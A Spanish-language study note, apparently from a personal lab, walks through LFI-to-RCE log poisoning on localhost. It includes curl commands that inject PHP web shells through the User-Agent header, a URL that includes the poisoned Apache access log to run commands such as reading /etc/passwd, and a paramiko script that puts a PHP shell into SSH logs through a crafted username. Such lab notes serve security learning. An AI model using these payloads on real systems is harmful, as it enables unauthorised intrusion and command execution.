LFI -> RCE

view-source:http://localhost/index.php?filename=/var/log/apache2/access.log
ES EL LOG QUE CADA TIEMPO CAMBIA
![[Pasted image 20250328230919.png]]En este archivo esta evidenciando user agent de la peticion que se hace

Enviamos una peticion por get modificando la cabecera de user agent 
![[Pasted image 20250328231146.png]]
Lo enviamos y aparecera lo siguiente:
![[Pasted image 20250328231256.png]]

Incluso se puede injectar comandos php de la siguiente manera:
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"

Si se logra injectar se tensa
![[Pasted image 20250328231503.png]]
En este caso vemos que si se puedo ejecutar comandos


Ahora probemos ejecutando este codigo 
$ curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php phpinfo(); ?>"  
Esto arrojara la informacion de la siguiente manera
Se suele cargar esto para ver si hay opciones o funciones deshabilitadas
esto lo vemos en http://localhost/index.php?filename=/var/log/apache2/access.log
![[Pasted image 20250328231846.png]]

ahora inyectamos esto
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
aparecera asi:
![[Pasted image 20250328232632.png]]
pero hacemos lo siguiente en la barra de busqueda:
view-source:http://localhost/index.php?filename=/var/log/apache2/access.log&cmd=id

con &cmd=id habilitamos la ejecucion de comandos en la barra de busqueda por lo tanto aparecera asi en la pagina web

Aqui ejecutamos un cat /etc/passwd y aparece asi
![[Pasted image 20250328232843.png]]

En eso consiste el log posioning



AHORA CONTAMINAREMOS UN LOG DE SSH
![[Pasted image 20250328233059.png]]
Aqui ingresamos primero a la ruta  /var/log
para ssh es el btmp
desde nuestra consola intenamos conectarnos a ssh con contraseña incorrecta y por lo tanto se generara un log en automatico

para poder acceder a btmp y ejecutar un comando php podemos crear un script en python con el siguiente contenido
`import paramiko`

# `Configuración de la víctima`
`TARGET_IP = "x.x.x.x"  # Reemplazar con la IP del contenedor Docker`
`LOG_PATH = "/var/www/html/auth.log"  # Debe ser accesible desde el navegador`

# `Payload PHP para ejecución remota de comandos`
`PAYLOAD = "hacker'; echo '<?php system($_GET[\'cmd\']); ?>' >> " + LOG_PATH + "; '"`

# `Configurar cliente SSH`
`ssh = paramiko.SSHClient()`
`ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())`

`try:`
    `# Intentamos autenticarnos con el usuario malicioso para inyectar el payload en los logs`
    `ssh.connect(TARGET_IP, username=PAYLOAD, password="incorrecto")`
`except Exception as e:`
    `print("Conexión fallida (esperado):", str(e))`


Si var/log/btmp tiene permisos de lectura podemos desde la misma url acceder de la siguiente manera:
![[Pasted image 20250328235414.png]]

de esa manera se contaminan logs
Incluso por smtp
Hay muchas maneras y variantes aliados con filter chain y enumerar logs poder contaminarlos 

